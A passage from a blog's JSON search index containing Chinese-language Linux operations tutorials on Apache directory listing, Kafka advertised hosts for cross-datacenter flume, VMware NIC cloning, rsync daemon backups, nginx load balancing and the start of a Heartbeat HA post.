&quot;-1day&quot;&#96;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"rsync","slug":"rsync","permalink":"https://garywu520.github.io/tags/rsync/"},{"name":"tar","slug":"tar","permalink":"https://garywu520.github.io/tags/tar/"},{"name":"crontab","slug":"crontab","permalink":"https://garywu520.github.io/tags/crontab/"}]},{"title":"Apache目录浏览功能-部署","slug":"Apache目录浏览功能-部署","date":"2017-08-10T11:51:43.000Z","updated":"2017-08-18T10:47:07.646Z","comments":true,"path":"2017/08/10/Apache目录浏览功能-部署/","link":"","permalink":"https://garywu520.github.io/2017/08/10/Apache%E7%9B%AE%E5%BD%95%E6%B5%8F%E8%A7%88%E5%8A%9F%E8%83%BD-%E9%83%A8%E7%BD%B2/","excerpt":"安装 123yum install httpd -yapachectl -v 查看Apache版本chkconfig --levels 235 httpd on 开机启动","text":"安装 123yum install httpd -yapachectl -v 查看Apache版本chkconfig --levels 235 httpd on 开机启动 Apache配置文件 1234主配置文件: &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf 虚拟主机配置目录：&#x2F;etc&#x2F;httpd&#x2F;conf.d 为了便于管理，建议在此目录为每一个虚拟主机创建一个配置文件。注：&#x2F;etc&#x2F;httpd&#x2F;conf.d 目录的配置文件必须以*.conf结尾 Apache配置文件-详解 1234567891011121314151617181920212223242526272829303132ServerAdmin webmaster@domain.com 设置服务器错误页面用于联系管理员的邮箱地址（没蛋用）。ServerName www.domain.com 设置虚拟主机的域名ServerAlias domain.com 设置域名别名（设置了DNS且能正常解析的情况下，还可以一用）DirectoryIndex index.php index.html 如果访客没有输入特定访问的文件，服务就会使用这个文件，当你想用一个文件来替代默认文件，或者用一个非标准的主页文件（如 index.php）时，这个配置就很有用，你可以设置多个文件。DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;public 域名映射的目录地址，使用绝对路径。通过域名地址来访问，服务会查看 DocumentRoot 的配置来决定到那里去查找文件，然后，查看 DirectoryIndex 的配置来决定使用那个文件来显示给访问者。ErrorDocument 404 &#x2F;errors&#x2F;404.html ErrorDocument 403 &#x2F;errors&#x2F;403.html在这个示例中，虚拟主机的 public 目录下有 errors 目录，在 errors 目录下创建了相应的错误显示文件，配置中设置的是基于 DocumentRoot 的相对路径。如果没有设置，apache 会使用自己生成的错误页面，当有错误发生时，自定义的错误页面可以提供一直的用户体验，可以展现任何信息给访问者。&lt;Directory &#x2F;home&#x2F;demo&#x2F;public_html&#x2F;domain.com&#x2F;public&gt; Options FollowSymLinks&lt;&#x2F;Directory&gt;为特定的目录设置选项，上例中为 domain.com 的 public 目录开启 FollowSymLinks。在 Directory 块中可以通过 Options 来激活或失效一些功能特性。Options -Indexes使用 -Indexes 或 None 关闭目录浏览，使用 +Indexes 激活，目录浏览在没有发现设置的 DirectoryIndex 时，会呈现目录中的文件名列表给用户。Options -Includes失效或激活服务端的 IncludesAllowOverride NoneAllowOverride 设置为 none 可以失效 .htaccess 支持，设置为 All 可以激活它们，.htaccess 文件可以在主配置文件外配置 apache 的控制指令，如果你想让有的用户修改配置而又不想让他修改主配置文件，它通常用于密码保护的目录。Options None 这会关闭所有可用的选项，包括被父目录默认激活的选择。 层级 1234567891011121314Options 指令可以根据每一个目录设置：&lt;Directory &#x2F;&gt; AllowOverride None Options None&lt;&#x2F;Directory&gt;&lt;Directory &#x2F;var&#x2F;www&#x2F;html&#x2F;public&gt; AllowOverride All&lt;&#x2F;directory&gt;第一个 Directory 块中关闭了所有的 Options，对于所有的目录失效了 .htaccess。然后，第二个 Directory 配置会覆盖第一个的配置，从而激活了 domain.com&#x2F;public 目录下的 .htaccess 支持。 修改默认目录/端口 123456789101112131415161718vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.confListen 8080 修改端口DocumentRoot &quot;&#x2F;data&#x2F;web&quot; 默认目录修改为&#x2F;data&#x2F;web&lt;Directory &quot;&#x2F;data&#x2F;web&quot;&gt; Options Indexes FollowSymLinks #开启索引目录 IndexOptions NameWidth&#x3D;25 Charset&#x3D;UTF-8 AllowOverride None Order allow,deny Allow from all&lt;&#x2F;Directory&gt;注：(1)开启索引目录需要确认httpd.conf拥有以下模块，否则将会报错 LoadModule autoindex_module modules&#x2F;mod_autoindex.so LoadModule dir_module modules&#x2F;mod_dir.so(2)&quot;IndexOptions Charset&#x3D;UTF-8&quot;设置字符集，以消除中文乱码，NameWidth&#x3D;50 ：指定目录列表可以显示最长为25字节的文件&#x2F;目录名。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"apache","slug":"apache","permalink":"https://garywu520.github.io/tags/apache/"},{"name":"目录浏览","slug":"目录浏览","permalink":"https://garywu520.github.io/tags/%E7%9B%AE%E5%BD%95%E6%B5%8F%E8%A7%88/"}]},{"title":"flume跨机房拉取内网kafka消息的问题","slug":"flume跨机房拉取内网kafka消息的问题","date":"2017-08-07T09:54:10.000Z","updated":"2018-03-07T12:46:31.905Z","comments":true,"path":"2017/08/07/flume跨机房拉取内网kafka消息的问题/","link":"","permalink":"https://garywu520.github.io/2017/08/07/flume%E8%B7%A8%E6%9C%BA%E6%88%BF%E6%8B%89%E5%8F%96%E5%86%85%E7%BD%91kafka%E6%B6%88%E6%81%AF%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"123原来flume跨机房拉取(公网IP)的kafka服务器消息一切正常，业务迁移到openstack虚拟机后遇到了坑。注: openstack没有公网IP","text":"123原来flume跨机房拉取(公网IP)的kafka服务器消息一切正常，业务迁移到openstack虚拟机后遇到了坑。注: openstack没有公网IP flume拉取日志错误12345由日志报错可确定flume、kafka和zookeeper的工作流程。首先,机房2的flume跨机房找机房1的zookeeper(flume里面配置了另一个机房的zookeeper集群信息；能跨机房连接这一步肯定是配置了NAT的), zookeeper告诉flume：我给你我这边的kafka的地址，你自己去联系并索要(由lua二次开发的nginx产生的)kafka消息，于是zookeeper就把kafka内网IP给了flume，flume拿到内网kafka的IP地址和端口就懵逼了,我TM连接不上啊......这就是你看到的flume日志的报错,一直在重试连接并不断返回连接失败。 方案解决-思路12345前提:1.机房1和机房2的kafka需要有相同的topic,没有就创建。2.机房1的zookeeper集群需要完成DNAT映射,让机房2的flume能连接过去刚才已经分析完了报错信息，下面就尝试去解决。 KAFKA配置-修改监听域名(非内网IP)-是否能解决问题？123456789101112带着疑问，各种修改，hosts添加解析，各种NAT映射，最后测试结果是：(1)在机房1的kafka生产消息，在机房2的kafka消费消息，测试OK，这样的话跨公网的问题就解决了。需要注意的是，需要在机房2的flume服务器配置hosts把域名指向机房1的DNAT映射。(2)在测试机房1的业务POST请求是否能被机房2的flume拉取的过程中, 机房2的flume竟然无法消费，什么尼玛情况...刚才已经确认机房1和机房2的kafka直接没有问题，那么问题就可能出现在(机房1的)lua-Nginx到(机房1)kafka的过程出现了错误。经过查看lua二次开发的Nginx错误日志可以发现这一条信息：producer.lua:255: buffered messages send to kafka err: test76.xxx.com could not be resolved (110: Operation timed out), retryable: true, topic: test, partition_id: 4, length: 1, context: ngx.timer, client: X.X.X.X, server: 0.0.0.0:80这条信息很明显,说kafka由监听内网IP改为监听域名后,这个域名无法解析，Lua-Nginx生产消息后发送到同机房的kafka过程中发生了错误。各种Google、某度，尝试了大半天，配置改的乱七八糟，最后得出一个结论：用Lua二次开发的Nginx &quot;他妈的&quot;不支持向kafka域名监听的地址发送生产的业务消息。无奈整套方案放弃,修改的配置全部恢复。 最后通过官方文档了解到KAFKA如下两个参数12345678910111213141516advertised.host.name&#x3D;X.X.X.Xadvertised.port&#x3D;9092这两个kafka配置参数意思是：把这个地址注册到zookeeper，当外部(机房2)flume等程序过来请求zookeeper的时候,zookeeper告诉外部程序flume, kafka的IP地址和端口是这两个参数定义的，(这个IP可以是公网IP)，这就好办了，当配置了公网IP,flume就能找到机房1的kafka集群了。实施: 在机房1的kafka集群的机器中，每台kafka集群配置中都加这两个参数，保存，重启kafka,重启zookeeper。注:这个参数的公网IP和端口需要提前在iptables完成DNAT映射。---------------------------------------------------------------------------------------------最终测试：1. 在机房1 POST访问请求Lua-KAFKA,让其产生消息2. 在机房1的kafka查看Topic为test的消费消息(速度最快)3. 在机房2的kafka查看Topic为test的消费消息(由于跨公网,速度稍有延迟)4. 把测试的Topic改为正式的Topic即可。测试结果:完美+感人！ 参考: KAFKA官方说明文档 KAFKA常用命令参考","categories":[],"tags":[{"name":"kafka","slug":"kafka","permalink":"https://garywu520.github.io/tags/kafka/"},{"name":"zookeeper","slug":"zookeeper","permalink":"https://garywu520.github.io/tags/zookeeper/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"NAT","slug":"NAT","permalink":"https://garywu520.github.io/tags/NAT/"},{"name":"flume","slug":"flume","permalink":"https://garywu520.github.io/tags/flume/"},{"name":"kafka生产消费","slug":"kafka生产消费","permalink":"https://garywu520.github.io/tags/kafka%E7%94%9F%E4%BA%A7%E6%B6%88%E8%B4%B9/"},{"name":"lua nginx","slug":"lua-nginx","permalink":"https://garywu520.github.io/tags/lua-nginx/"}]},{"title":"vmware虚拟机-Linux多网卡配置","slug":"vmware虚拟机-Linux多网卡配置","date":"2017-08-05T09:40:25.000Z","updated":"2017-08-05T09:44:44.612Z","comments":true,"path":"2017/08/05/vmware虚拟机-Linux多网卡配置/","link":"","permalink":"https://garywu520.github.io/2017/08/05/vmware%E8%99%9A%E6%8B%9F%E6%9C%BA-Linux%E5%A4%9A%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE/","excerpt":"VMware虚拟机克隆与配置修改","text":"VMware虚拟机克隆与配置修改 12345678910111213141516171819201. 添加多网卡2. 复制网卡配置文件并修改IP地址、子网掩码等信息 cd &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F; cp ifcfg-eth0 ifcfg-eth1 # 一清空 &gt;&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules #开机自动清空网卡规则 echo &#39;&gt;&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules&#39; &gt;&gt;&#x2F;etc&#x2F;rc.local tail -1 &#x2F;etc&#x2F;rc.local # 两删除 grep -E &quot;HWADDR|UUID&quot; &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth[01] sed -r &quot;&#x2F;HWADDR|UUID&#x2F;d&quot; &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth[01] sed -ri &quot;&#x2F;HWADDR|UUID&#x2F;d&quot; &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth[01] grep -E &quot;HWADDR|UUID&quot; &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth[01]4. 重启网卡 &#x2F;etc&#x2F;init.d&#x2F;network restart注：Windows网络连接中vmnet1和vmnet8 IP地址不能与网关冲突 12345678910111213141516171819预览网卡配置信息[root@root network-scripts]# cat ifcfg-eth[01]DEVICE&#x3D;eth0TYPE&#x3D;EthernetONBOOT&#x3D;yesNM_CONTROLLED&#x3D;yesBOOTPROTO&#x3D;staticIPADDR&#x3D;10.1.0.200NETMASK&#x3D;255.255.255.0GATEWAY&#x3D;10.1.0.254DNS1&#x3D;223.5.5.5DNS2&#x3D;223.6.6.6DEVICE&#x3D;eth1TYPE&#x3D;EthernetONBOOT&#x3D;yesNM_CONTROLLED&#x3D;yesBOOTPROTO&#x3D;staticIPADDR&#x3D;172.16.1.200NETMASK&#x3D;255.255.255.0 克隆：选择链接克隆-节省空间 前提：模板机需要存在 克隆后的主机-修改 1231. 修改主机名 &#x2F;etc&#x2F;sysconfig&#x2F;network2. 修改hosts文件 &#x2F;etc&#x2F;hosts3. 修改IP地址","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"vmware","slug":"vmware","permalink":"https://garywu520.github.io/tags/vmware/"},{"name":"虚拟机克隆","slug":"虚拟机克隆","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%85%8B%E9%9A%86/"}]},{"title":"rsync备份","slug":"期中架构-rsync备份","date":"2017-08-05T02:59:14.000Z","updated":"2017-08-12T04:13:00.407Z","comments":true,"path":"2017/08/05/期中架构-rsync备份/","link":"","permalink":"https://garywu520.github.io/2017/08/05/%E6%9C%9F%E4%B8%AD%E6%9E%B6%E6%9E%84-rsync%E5%A4%87%E4%BB%BD/","excerpt":"rsync 命令是一个远程同步工具，默认使用增量算法，即只同步两个文件的不同部分，而不是每次同步整个文件，所以速度可观。如果备份目录为空，首次将进行全量备份，后边再次同步，自动变为增量备份。其默认端口号：873","text":"rsync 命令是一个远程同步工具，默认使用增量算法，即只同步两个文件的不同部分，而不是每次同步整个文件，所以速度可观。如果备份目录为空，首次将进行全量备份，后边再次同步，自动变为增量备份。其默认端口号：873 rsync特点 1234567(1) rsync支持全量与增量的数据备份(2) rsync命令功能与其他命令功能有重合性。比如：scp、cp、rm、ls (3) 增量数据同步算法-实现rsync增量同步数据，运用了其独特的“quick check”算法。(4) 可实现增量同步，即只同步发生变化的数据，因此数据传输效率很高。(5) 可以使用rcp,rsh,ssh等方式来配合进行隧道加密传输文件。(6) 可以使用socket（进程方式）传输文件和数据（服务端和客户端）(7) 支持匿名的或认证（无需系统用户）的进程模式传输，可实现方便安全的进行数据备份及镜像。 12345678910111213rsync命令功能与其他命令功能有重合性。比如：scp、cp、rm、ls # rsync &#x3D;&#x3D;&#x3D; scp 示例：scp -rp &#x2F;etc&#x2F;hosts 172.16.1.31:&#x2F;tmprsync -avz &#x2F;etc&#x2F;hosts 172.16.1.31:&#x2F;tmp&#x2F;hosts02# rsync &#x3D;&#x3D; cp 示例：cp -rp &#x2F;etc&#x2F;hosts &#x2F;tmp&#x2F;hosts01rsync -avz &#x2F;etc&#x2F;hosts &#x2F;tmp&#x2F;hosts02 # rsync &#x3D;&#x3D; ls示例：ls &#x2F;tmp&#x2F;rsync &#x2F;tmp&#x2F;ll &#x2F;tmp&#x2F; 工作场景 12(1) 利用定时任务cron+rsync实现实时同步数据, 同步的数据信息一般是网站内部人员使用的。(2) 利用实时同步软件inotify或sersync等+rsync实现实时同步数据，同步的信息一般是网站用户上传的数据信息。 rsync传输方式 1234567891011121314151617# Rsync大致使用三种主要的传输数据的方式。分别为：(1)单个主机本地之间的数据传输（此时类似于cp命令的功能）。 # 拷贝passwd文件和log目录到tmp目录下 rsync -avz &#x2F;etc&#x2F;passwd &#x2F;var&#x2F;log &#x2F;tmp&#x2F; ls -l &#x2F;tmp&#x2F; (2) 借助rcp,ssh等通道来传输数据（此时类似于scp命令的功能）。 概念：PUSH（推送）；PULL（拉取） 推送： rsync -avz &#x2F;etc&#x2F;passwd root@172.16.1.31:&#x2F;tmp&#x2F;pass 把本地的passwd文件推送到远程31服务器的&#x2F;tmp目录下，并重命名为pass文件 拉取： rsync -avz -e &quot;ssh -p 22&quot; root@10.1.0.41:&#x2F;var&#x2F;log &#x2F;opt 把10.1.0.41机器上的&#x2F;var&#x2F;log目录通过ssh方式拉取到本地的&#x2F;opt目录(3) 以守护进程（socket）的方式传输数据（这个是rsync自身的重要的功能）。 rsync详细参数 1234567891011121314151617-v --verbose详细模式输出，传输时的进度等信息-a --archive 归档模式，等于-rtopgDl-z --compress 传输时进行压缩以提高传输效率-e --rsh&#x3D;COMMAND 使用的信协议，如ssh--exclude&#x3D;filename 指定排除不需要传输的文件--exclude-from&#x3D;paichu.txt 指定排除的N个文件中，与tar排除类似--bwlimit&#x3D;100 限速功能: 100KB&#x2F;s,可根据实际情况修改--delete 删除注：如果是把rsync放到脚本中运行，可以把-v参数去掉，不让其打印详细信息。 –delete参数-使用 12345678910111213141516171819[root@backup ~]# touch &#x2F;tmp&#x2F;&#123;1..10&#125;.txt[root@backup ~]# mkdir &#x2F;null[root@backup ~]# rsync -avz --delete &#x2F;null&#x2F; &#x2F;tmp&#x2F; 同步空目录内容到&#x2F;tmp目录，就等同于删除。sending incremental file list.&#x2F;deleting .ICE-unix&#x2F;deleting 9.txtdeleting 8.txtdeleting 7.txtdeleting 6.txtdeleting 5.txtdeleting 4.txtdeleting 3.txtdeleting 2.txtdeleting 10.txtdeleting 1.txtsent 29 bytes received 15 bytes 88.00 bytes&#x2F;sectotal size is 0 speedup is 0.00 rsync 守护进程模式部署 服务端配置： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980(1)安装yum install -y rsync(2)创建用户以及存储目录，并修改存储目录的属主属组 useradd -s &#x2F;sbin&#x2F;nologin -M rsync useradd -s &#x2F;sbin&#x2F;nologin -M data mkdir &#x2F;rsync_backup &#x2F;dataB -p chown -R rsync:rsync &#x2F;rsync_backup chown -R data:data &#x2F;rsync_backup_B ls -ld &#x2F;rsync_backup &#x2F;dataB(3)配置（创建配置文件,默认没有）vim &#x2F;etc&#x2F;rsyncd.conf###########################################################全局配置uid &#x3D; rsyncgid &#x3D; rsyncuse chroot &#x3D; no 安全相关max connections &#x3D; 200 最大连接数（根据实际需求修改）timeout &#x3D; 300 超时时间,单位:毫秒pid file &#x3D; &#x2F;var&#x2F;run&#x2F;rsyncd.pid 进程对应的进程号文件lock file &#x3D; &#x2F;var&#x2F;run&#x2F;rsync.lock 锁文件log file &#x3D; &#x2F;var&#x2F;log&#x2F;rsyncd.log 日志文件#模块配置[backup] 模块名称comment &#x3D; &quot;这里是注释信息&quot;path &#x3D; &#x2F;backup 模块对应的路径ignore errors 忽略错误程序read only &#x3D; false 是否只读list &#x3D; false 是否可以列表hosts allow &#x3D; 172.16.1.0&#x2F;24 指定允许访问rsync服务器的客户端IP范围（白名单）hosts deny &#x3D; 0.0.0.0&#x2F;32 禁止访问rsync服务器的客户端IP范围（黑名单）auth users &#x3D; rsync_backup 只用于认证（该用户不存在）secrets file &#x3D; &#x2F;etc&#x2F;rsync.password# 设置进行连接认证的密钥文件 不存在的用户进行认证时使用的密钥文件##########################################################################配置文件-高级配置参考use chroot &#x3D; nomax connections &#x3D; 200timeout &#x3D; 300pid file &#x3D; &#x2F;var&#x2F;run&#x2F;rsyncd.pidlock file &#x3D; &#x2F;var&#x2F;run&#x2F;rsync.locklog file &#x3D; &#x2F;var&#x2F;log&#x2F;rsyncd.logignore errorsread only &#x3D; falselist &#x3D; false[backup]uid &#x3D; rsyncgid &#x3D; rsyncpath &#x3D; &#x2F;rsync_backuphosts allow &#x3D; 10.0.10.0&#x2F;24auth users &#x3D; rsync_baksecrets file &#x3D; &#x2F;etc&#x2F;rsync.password[data]uid &#x3D; datagid &#x3D; datapath &#x3D; &#x2F;dataBhosts allow &#x3D; 10.0.10.0&#x2F;24auth users &#x3D; garywusecrets file &#x3D; &#x2F;etc&#x2F;data.password##########################################################################(4)创建用户密码文件 echo &quot;oldgirl:oldboy123&quot; &gt;&#x2F;etc&#x2F;rsync.password 创建用户密码文件 echo &quot;oldboy:oldboy123&quot; &gt;&#x2F;etc&#x2F;data.password chmod 600 &#x2F;etc&#x2F;rsync.password 修改密码文件权限 ls -l &#x2F;etc&#x2F;data.password(5)启动服务 rsync --daemon --config&#x3D;&#x2F;etc&#x2F;rsyncd.conf 启动服务 netstat -lntup |grep rsync 查看服务运行情况 ss -lntup |grep rsync 客户端配置 12345678(1)安装 yum install -y rsync (2)创建密码文件 echo &quot;oldboy123&quot; &gt;&#x2F;etc&#x2F;rsync.password(3)修改密码文件权限,让权限更严谨 chmod 600 &#x2F;etc&#x2F;rsync.password 客户端-免密码传输测试 1234567rsync -avz &#x2F;etc&#x2F;passwd rsync_backup@172.16.1.41::backup --password-file&#x3D;&#x2F;etc&#x2F;rsync.password注：① 用户是服务端配置文件中配置的非系统用户② 指定存储路径模块名称时，需要使用“::”③ --password-file&#x3D;&#x2F;etc&#x2F;rsync.password 用来指定密码文件路径,实现免密登陆，否则提示输入密码④ rsync备份：如果备份目录为空，首次将进行全量备份，后边再次同步，自动变为增量备份。 无差异备份-什么是无差异备份？ 123456789101112即, 不管服务器上传目录中原来有什么文件或目录，都要与客户端上传的目录或文件信息一致。如果服务器上传目录中原来有目录和文件，如果与客户端要上传的信息不匹配，则会先把服务器上传目录中不匹配的原数据删除。实现无差异备份，需要使用--delete参数，如：[root@nfs01 ~]# rsync -avz --delete abc&#x2F; rsync_backup@172.16.1.41::nfsbackup --password-file&#x3D;&#x2F;etc&#x2F;rsync.passwordsending incremental file list.&#x2F;deleting tmp&#x2F;.ICE-unix&#x2F;deleting rc.localdeleting tmp&#x2F;optimize-init_sys.shanaconda.ifcfg.loganaconda.log rsync-异常总结 123456789错误1：@ERROR: auth failed on module backuprsync error: error starting client-server protocol (code 5) at main.c(1503) [sender&#x3D;3.0.6]原因:1. 认证的用户名或者密码输入不正确2. 认证的文件编写有问题（认证内容信息）3. 认证文件的权限设置的不正确（权限必须为600，属主属组权限保持默认root即可）4. 配置文件中指定的认证文件路径与实际认证的文件路径不符。 123456789错误2：Connection refused (111)rsync error: error in socket IO (code 10) at clientserver.c(124) [sender&#x3D;3.0.6]原因：1. 检查iptables防火墙配置2. 检查selinux配置3. 检查rsync服务 netstat -lntup |grep rsync 1234567问题3：@ERROR: chdir failedrsync error: error starting client-server protocol (code 5) at main.c(1503) [sender&#x3D;3.0.6]原因：rsync服务端没有模块指定的目录，需要创建与授权[root@backup ~]# mkdir &#x2F;nfsbackup[root@backup ~]# chown -R rsync.rsync &#x2F;nfsbackup&#x2F; 关闭其进程 123456789101112方法1：netstat -apn |grep rsync 获取pid进程号kill -s 9 pid号 方法2：格式：killall 进程名示例：killall rsync方法3(模糊杀手-慎用)：pkill rsync ps -ef |grep rsync 比如：有个脚本在后台运行，执行pkill sh命令后，其会将所有netstat -lntup|grep sh的进程都杀掉，并且不会告知结果信息。 rsync 扩展功能 rsync服务器端多模块的配置 1234567891011vim &#x2F;etc&#x2F;rsyncd.conf ...........[backup]comment &#x3D; &quot;backup dir&quot;path &#x3D; &#x2F;backup[nfsbackup]comment &#x3D; &quot;nfsbackup dir&quot;path &#x3D; &#x2F;nfsbackup 客户端传输过程中，创建目录并将文件存放在创建的目录下 1234rsync -avz &#x2F;etc&#x2F;rc.local rsync_backup@172.16.1.41::nfsbackup&#x2F;web&#x2F; --password-file&#x3D;&#x2F;etc&#x2F;rsync.password 其中，&quot;&#x2F;web&#x2F;&quot; 即为创建的1级目录；如果多级目录不存在，则不能同时创建多级目录 目录同步-注意点 1234[root@nfs01 tmp]# rsync -avz &#x2F;tmp rsync_backup@172.16.1.41::nfsbackup --password-file&#x3D;&#x2F;etc&#x2F;rsync.password 同步目录的时候，需要注意的是“&#x2F;tmp”, 表示同步tmp目录下所有文件及目录本身；如果是“&#x2F;tmp&#x2F;” 表示同步目录下内容，不包括目录本身","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"rsync","slug":"rsync","permalink":"https://garywu520.github.io/tags/rsync/"},{"name":"备份","slug":"备份","permalink":"https://garywu520.github.io/tags/%E5%A4%87%E4%BB%BD/"}]},{"title":"使用nginx实现HTTP负载均衡-官网翻译版","slug":"使用nginx实现HTTP负载均衡-官网翻译版","date":"2017-08-03T03:05:03.000Z","updated":"2018-04-03T03:40:15.270Z","comments":true,"path":"2017/08/03/使用nginx实现HTTP负载均衡-官网翻译版/","link":"","permalink":"https://garywu520.github.io/2017/08/03/%E4%BD%BF%E7%94%A8nginx%E5%AE%9E%E7%8E%B0HTTP%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1-%E5%AE%98%E7%BD%91%E7%BF%BB%E8%AF%91%E7%89%88/","excerpt":"负载均衡方法12345nginx支持以下负载均衡机制（或者方法）：- round-robin&#x2F;轮询： 到应用服务器的请求以round-robin&#x2F;轮询的方式被分发- least-connected&#x2F;最少连接：下一个请求将被分派到活动连接数量最少的服务器- ip-hash&#x2F;IP散列： 使用hash算法来决定下一个请求要选择哪个服务器(基于客户端IP地址)","text":"负载均衡方法12345nginx支持以下负载均衡机制（或者方法）：- round-robin&#x2F;轮询： 到应用服务器的请求以round-robin&#x2F;轮询的方式被分发- least-connected&#x2F;最少连接：下一个请求将被分派到活动连接数量最少的服务器- ip-hash&#x2F;IP散列： 使用hash算法来决定下一个请求要选择哪个服务器(基于客户端IP地址) nginx反向代理实现12345在nginx中反向代理的实现包括HTTP, HTTPS, FastCGI, uwsgi, SCGI, 和 memcached的负载均衡。要配置负载均衡用HTTPS替代HTTP，只要使用&quot;https&quot;作为协议即可。为FastCGI, uwsgi, SCGI, 或 memcached 搭建负载均衡时， 只要使用相应的fastcgi_pass, uwsgi_pass, scgi_pass, 和 memcached_pass指令。 默认轮询负载均衡nginx中最简单的负载均衡配置看上去大体如下： 123456789101112131415http &#123; upstream myapp1 &#123; server srv1.example.com; server srv2.example.com; server srv3.example.com; &#125; server &#123; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;myapp1; &#125; &#125;&#125; 1在上面的例子中， 同一个应用有3个实例分别运行在srv1-srv3。当没有特别指定负载均衡方法时， 默认为round-robin&#x2F;轮询。所有请求被代理到服务器集群myapp1， 然后nginx实现HTTP负载均衡来分发请求。 最少连接负载均衡(least_conn)123另一个负载均衡方式是least-connected&#x2F;最少连接。当某些请求需要更长时间来完成时，最少连接可以更公平的控制应用实例上的负载。使用最少连接负载均衡时，nginx试图尽量不给已经很忙的应用服务器增加过度的请求， 而是分配新请求到不是那么忙的服务器实例。 12345678nginx中通过在服务器集群配置中使用least_conn指令来激活最少连接负载均衡方法：upstream myapp1 &#123; least_conn; server srv1.example.com; server srv2.example.com; server srv3.example.com;&#125; 会话持久化(ip-hash)123如果需要将一个客户端绑定给某个特定的应用服务器——用另一句话说，将客户端会话&quot;沾住&quot;或者&quot;持久化&quot;，以便总是能选择特定服务器——，那么可以使用ip-hash负载均衡机制。使用ip-hash时，客户端IP地址作为hash key使用，用来决策选择服务器集群中的哪个服务器来处理这个客户端的请求。这个方法保证从同一个客户端发起的请求总是定向到同一台服务器，除非服务器不可用。 12345678要配置使用ip-hash负载均衡，只要在服务器集群配置中使用ip_hash指令：upstream myapp1 &#123; ip_hash; server srv1.example.com; server srv2.example.com; server srv3.example.com;&#125; 带权重的负载均衡1234567891011可以通过使用服务器权重来影响nginx的负载均衡算法。在上面的例子中，服务器权重没有配置，这意味着所有列出的服务器被认为对于具体的负载均衡方法是完全平等的。当服务器被指定weight&#x2F;权重参数时，负载均衡决策会考虑权重。例如：upstream myapp1 &#123; server srv1.example.com weight&#x3D;3; server srv2.example.com; server srv3.example.com;&#125; 123在这个配置中，每5个新请求将会如下的在应用实例中分派： 3个请求分派去srv1,一个去srv2,另外一个去srv3.在最新的nginx版本中，可以在最少连接和IP哈希负载均衡中使用权重。 健康检查123456789如果某台服务器响应失败，nginx将标记这台服务器为&quot;失败&quot;，之后的一段时间将尽量避免选择这台服务器来处理后续请求。max_fails&#x3D;number 设定Nginx与服务器通信的尝试失败的次数。表示如果达到失败次数，Nginx就认为服务器不可用，同时在指定的时间内不再尝试这台机器。fail_timeout&#x3D;time 在此期间应该发起指定数量的和服务器通讯的不成功尝试，以判断服务器是否不可到达。在这段时间中，服务器失败次数达到指定的尝试次数，服务器就被认为不可用。 12345upstream myapp1 &#123; server srv1.example.com weight&#x3D;3 max_fails&#x3D;1 fail_timeout&#x3D;10s; server srv2.example.com max_fails&#x3D;1 fail_timeout&#x3D;10s; server srv3.example.com max_fails&#x3D;1 fail_timeout&#x3D;10s;&#125;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"负载均衡","slug":"负载均衡","permalink":"https://garywu520.github.io/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"},{"name":"HTTP","slug":"HTTP","permalink":"https://garywu520.github.io/tags/HTTP/"},{"name":"round-robin轮询","slug":"round-robin轮询","permalink":"https://garywu520.github.io/tags/round-robin%E8%BD%AE%E8%AF%A2/"},{"name":"least-connected最少连接","slug":"least-connected最少连接","permalink":"https://garywu520.github.io/tags/least-connected%E6%9C%80%E5%B0%91%E8%BF%9E%E6%8E%A5/"},{"name":"ip-hash","slug":"ip-hash","permalink":"https://garywu520.github.io/tags/ip-hash/"}]},{"title":"HA高可用之Heartbeat-部署","slug":"HA高可用之Heartbeat-部署","date":"2017-08-03T02:48:55.000Z","updated":"2017-08-08T10:32:38.077Z","comments":true,"path":"2017/08/03/HA高可用之Heartbeat-部署/","link":"","permalink":"https://garywu520.github.io/2017/08/03/HA%E9%AB%98%E5%8F%AF%E7%94%A8%E4%B9%8BHeartbeat-%E9%83%A8%E7%BD%B2/","excerpt":"HA即(high available)高可用，又被叫做双机热备，用于关键性业务。简单理解就是，有2台机器 A 和 B，正常是 A 提供服务，B 待命闲置，当 A 宕机或服务宕掉，会切换至B机器继续提供服务。常见的实现高可用的开源软件有 heartbeat 和 keepalived。","text":"HA即(high available)高可用，又被叫做双机热备，用于关键性业务。简单理解就是，有2台机器 A 和 B，正常是 A 提供服务，B 待命闲置，当 A 